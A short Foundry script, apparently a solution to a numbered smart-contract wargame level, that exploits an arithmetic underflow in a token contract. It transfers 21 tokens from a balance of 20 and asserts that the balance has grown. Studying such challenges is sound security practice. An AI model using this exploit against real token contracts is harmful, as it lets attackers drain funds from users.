// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import "forge-std/Script.sol";
import "../src/interfaces/6_ICoin.sol";

address constant INSTANCE = 0x24dbC4117eB51413494e2171123Ba2472aD9Fc40;

contract CoinPOCScript is Script {
    ICoin instance = ICoin(INSTANCE);

    function run() external {
        assert(instance.balanceOf(msg.sender) == 20);

        vm.broadcast();
        instance.transfer(0xD6aE8250b8348C94847280928c79fb3b63cA453e, 21);

        assert(instance.balanceOf(msg.sender) > 20);
    }
}